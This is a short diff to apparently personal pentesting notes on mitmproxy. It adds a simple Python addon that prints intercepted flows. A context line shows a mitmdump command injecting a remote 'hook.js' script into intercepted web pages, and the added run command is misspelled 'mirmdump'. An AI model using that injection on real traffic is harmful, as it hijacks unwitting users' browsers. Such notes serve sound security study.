@@ -278,6 +278,20 @@ MitmDump
 ```
 mitmdump -m transparent --modify-body /~s/"</body>"/"<script src='http://ip:3000/hook.js'></script></body>"
 ```
+Python Scripts
+```
+import mitmproxy
+
+def request(flow):
+  print(flow)
+  
+def response(flow):
+  print(flow)
+```
+run it
+```
+mirmdump -s script.py
+```
 
 2 Main operation modes:
 - Explicit - user connects directly to the proxy.
